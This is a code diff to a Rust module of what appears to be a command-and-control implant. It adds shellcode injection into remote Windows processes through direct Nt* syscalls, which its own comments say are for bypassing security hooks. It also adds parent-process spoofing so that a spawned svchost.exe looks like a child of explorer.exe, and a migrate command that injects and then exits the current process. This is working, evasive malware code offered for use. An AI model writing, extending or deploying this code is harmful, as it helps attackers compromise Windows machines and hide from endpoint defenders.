@@ -2,6 +2,10 @@
 //!
 //! All Win32 calls are behind `#[cfg(target_os = "windows")]`.
 //! Non-Windows builds get stubs that return an error string.
+//!
+//! When `use_syscalls` is true, injection uses direct Nt* syscalls
+//! (resolved from ntdll) instead of Win32 API calls, bypassing hooks.
+//! PPID spoofing is available for spawn+inject operations.
 
 /// Default spawnto process when none is configured.
 pub const DEFAULT_SPAWN_PROCESS: &str = r"C:\Windows\System32\svchost.exe";
@@ -11,6 +15,8 @@ pub const DEFAULT_SPAWN_PROCESS: &str = r"C:\Windows\System32\svchost.exe";
 #[cfg(target_os = "windows")]
 mod win {
     use super::DEFAULT_SPAWN_PROCESS;
+    use crate::evasion::ppid;
+    use crate::evasion::syscall::{self, nt_success, SyscallTable};
     use anyhow::Result;
     use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, BOOL, FALSE, HANDLE};
     use windows_sys::Win32::System::Memory::{
@@ -32,13 +38,13 @@ mod win {
         ) -> BOOL;
     }
 
-    /// Core injection routine: allocate RW → write → flip to RX → CreateRemoteThread.
-    /// Returns (exit_code, stdout, stderr).
-    unsafe fn inject_into_process(
+    // ─── Win32 API injection (original path) ────────────────────────────
+
+    /// Core injection routine via Win32 API: allocate RW → write → flip to RX → CreateRemoteThread.
+    unsafe fn inject_into_process_win32(
         process: HANDLE,
         shellcode: &[u8],
     ) -> (i32, String, String) {
-        // Allocate RW memory in target process.
         let base = VirtualAllocEx(
             process,
             core::ptr::null(),
@@ -54,7 +60,6 @@ mod win {
             );
         }
 
-        // Write shellcode.
         let mut written: usize = 0;
         if WriteProcessMemory(
             process,
@@ -71,7 +76,6 @@ mod win {
             );
         }
 
-        // W^X: flip to RX.
         let mut old_protect: u32 = 0;
         if VirtualProtectEx(
             process,
@@ -88,7 +92,6 @@ mod win {
             );
         }
 
-        // Execute via CreateRemoteThread.
         let thread = CreateRemoteThread(
             process,
             core::ptr::null(),
@@ -118,8 +121,103 @@ mod win {
         )
     }
 
+    // ─── Direct syscall injection path ──────────────────────────────────
+
+    /// Core injection routine via direct syscalls (Nt* functions).
+    unsafe fn inject_into_process_syscall(
+        table: &SyscallTable,
+        process: HANDLE,
+        shellcode: &[u8],
+    ) -> (i32, String, String) {
+        // NtAllocateVirtualMemory — RW
+        let mut base: *mut u8 = core::ptr::null_mut();
+        let mut size = shellcode.len();
+        let status = syscall::nt_allocate_virtual_memory(
+            table,
+            process,
+            &mut base,
+            &mut size,
+            MEM_COMMIT | MEM_RESERVE,
+            PAGE_READWRITE,
+        );
+        if !nt_success(status) {
+            return (
+                1,
+                String::new(),
+                format!("NtAllocateVirtualMemory failed: NTSTATUS 0x{:08X}", status as u32),
+            );
+        }
+
+        // NtWriteVirtualMemory
+        let status = syscall::nt_write_virtual_memory(table, process, base, shellcode);
+        if !nt_success(status) {
+            return (
+                1,
+                String::new(),
+                format!("NtWriteVirtualMemory failed: NTSTATUS 0x{:08X}", status as u32),
+            );
+        }
+
+        // NtProtectVirtualMemory — W^X flip to RX
+        let mut protect_base = base;
+        let mut protect_size = shellcode.len();
+        let mut old_protect: u32 = 0;
+        let status = syscall::nt_protect_virtual_memory(
+            table,
+            process,
+            &mut protect_base,
+            &mut protect_size,
+            PAGE_EXECUTE_READ,
+            &mut old_protect,
+        );
+        if !nt_success(status) {
+            return (
+                1,
+                String::new(),
+                format!("NtProtectVirtualMemory failed: NTSTATUS 0x{:08X}", status as u32),
+            );
+        }
+
+        // NtCreateThreadEx — execute
+        match syscall::nt_create_thread_ex(table, process, base) {
+            Ok(thread) => {
+                CloseHandle(thread);
+                (
+                    0,
+                    format!(
+                        "[*] Injected {} bytes at {:p} via syscall, thread started",
+                        shellcode.len(),
+                        base
+                    ),
+                    String::new(),
+                )
+            }
+            Err(e) => (1, String::new(), format!("{}", e)),
+        }
+    }
+
+    /// Dispatch to either Win32 or syscall injection path.
+    unsafe fn inject_into_process(
+        process: HANDLE,
+        shellcode: &[u8],
+        use_syscalls: bool,
+    ) -> (i32, String, String) {
+        if use_syscalls {
+            match SyscallTable::resolve() {
+                Ok(table) => inject_into_process_syscall(&table, process, shellcode),
+                Err(e) => (
+                    1,
+                    String::new(),
+                    format!("syscall table resolve failed: {}", e),
+                ),
+            }
+        } else {
+            inject_into_process_win32(process, shellcode)
+        }
+    }
+
     /// inject <pid> <shellcode>: inject into an existing process.
-    pub fn inject(pid: u32, shellcode: &[u8]) -> Result<(i32, String, String)> {
+    pub fn inject(pid: u32, shellcode: &[u8], use_syscalls: bool) -> Result<(i32, String, String)> {
         unsafe {
             let process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
             if process == 0 {
@@ -130,14 +228,14 @@ mod win {
                 ));
             }
 
-            let result = inject_into_process(process, shellcode);
+            let result = inject_into_process(process, shellcode, use_syscalls);
             CloseHandle(process);
             Ok(result)
         }
     }
 
     /// shinject <pid> <path>: read shellcode from file then inject.
-    pub fn shinject(pid: u32, shellcode_path: &str) -> Result<(i32, String, String)> {
+    pub fn shinject(pid: u32, shellcode_path: &str, use_syscalls: bool) -> Result<(i32, String, String)> {
         let shellcode = match std::fs::read(shellcode_path) {
             Ok(data) => data,
             Err(e) => {
@@ -151,18 +249,29 @@ mod win {
         if shellcode.is_empty() {
             return Ok((1, String::new(), "shellcode file is empty".to_string()));
         }
-        inject(pid, &shellcode)
+        inject(pid, &shellcode, use_syscalls)
     }
 
     /// spawn+inject: create suspended process, inject, resume.
+    ///
+    /// When `ppid_spoof` is `Some(parent_name)`, the sacrificial process is
+    /// created with PPID spoofing (parent set to the given process name,
+    /// e.g. "explorer.exe").
     pub fn spawn_inject(
         shellcode: &[u8],
         spawn_exe: Option<&str>,
         config_spawn: Option<&str>,
+        use_syscalls: bool,
+        ppid_spoof: Option<&str>,
     ) -> Result<(i32, String, String)> {
         let exe = spawn_exe
             .or(config_spawn)
             .unwrap_or(DEFAULT_SPAWN_PROCESS);
+
+        // Choose between PPID-spoofed and normal process creation.
+        if let Some(parent_name) = ppid_spoof {
+            return spawn_inject_spoofed(shellcode, exe, parent_name, use_syscalls);
+        }
 
         let exe_w: Vec<u16> = exe.encode_utf16().chain(core::iter::once(0)).collect();
 
@@ -195,16 +304,14 @@ mod win {
                 ));
             }
 
-            let result = inject_into_process(pi.hProcess, shellcode);
+            let result = inject_into_process(pi.hProcess, shellcode, use_syscalls);
 
             if result.0 != 0 {
-                // Injection failed — clean up the suspended process.
                 CloseHandle(pi.hThread);
                 CloseHandle(pi.hProcess);
                 return Ok(result);
             }
 
-            // Resume the main thread.
             ResumeThread(pi.hThread);
             CloseHandle(pi.hThread);
             CloseHandle(pi.hProcess);
@@ -219,6 +326,61 @@ mod win {
             ))
         }
     }
+
+    /// spawn+inject with PPID spoofing.
+    fn spawn_inject_spoofed(
+        shellcode: &[u8],
+        exe: &str,
+        parent_name: &str,
+        use_syscalls: bool,
+    ) -> Result<(i32, String, String)> {
+        // Resolve parent PID from process name.
+        let parent_pid = ppid::find_process_by_name(parent_name)?;
+
+        // Create suspended process with spoofed parent.
+        let (process, thread, pid) = ppid::create_process_spoofed(exe, parent_pid)?;
+
+        unsafe {
+            let result = inject_into_process(process, shellcode, use_syscalls);
+
+            if result.0 != 0 {
+                CloseHandle(thread);
+                CloseHandle(process);
+                return Ok(result);
+            }
+
+            ResumeThread(thread);
+            CloseHandle(thread);
+            CloseHandle(process);
+
+            Ok((
+                0,
+                format!(
+                    "[*] Spawned '{}' (PID {}, PPID spoofed via '{}' PID {}), injected {} bytes",
+                    exe, pid, parent_name, parent_pid, shellcode.len()
+                ),
+                String::new(),
+            ))
+        }
+    }
+}
+
+// ─── Windows: migrate (inject + ExitProcess) ─────────────────────────
+
+#[cfg(target_os = "windows")]
+pub fn migrate(pid: u32, shellcode: &[u8], use_syscalls: bool) -> anyhow::Result<(i32, String, String)> {
+    let result = win::inject(pid, shellcode, use_syscalls)?;
+    if result.0 != 0 {
+        return Ok(result);
+    }
+    unsafe {
+        windows_sys::Win32::System::Threading::ExitProcess(0);
+    }
+}
+
+#[cfg(not(target_os = "windows"))]
+pub fn migrate(_pid: u32, _shellcode: &[u8], _use_syscalls: bool) -> anyhow::Result<(i32, String, String)> {
+    Ok((1, String::new(), "migrate requires Windows".to_string()))
 }
 
 // ─── Non-Windows stubs ────────────────────────────────────────────────
@@ -227,11 +389,11 @@ mod win {
 mod stub {
     use anyhow::Result;
 
-    pub fn inject(_pid: u32, _shellcode: &[u8]) -> Result<(i32, String, String)> {
+    pub fn inject(_pid: u32, _shellcode: &[u8], _use_syscalls: bool) -> Result<(i32, String, String)> {
         Ok((1, String::new(), "inject requires Windows".to_string()))
     }
 
-    pub fn shinject(_pid: u32, _shellcode_path: &str) -> Result<(i32, String, String)> {
+    pub fn shinject(_pid: u32, _shellcode_path: &str, _use_syscalls: bool) -> Result<(i32, String, String)> {
         Ok((1, String::new(), "shinject requires Windows".to_string()))
     }
 
@@ -239,6 +401,8 @@ mod stub {
         _shellcode: &[u8],
         _spawn_exe: Option<&str>,
         _config_spawn: Option<&str>,
+        _use_syscalls: bool,
+        _ppid_spoof: Option<&str>,
     ) -> Result<(i32, String, String)> {
         Ok((
             1,
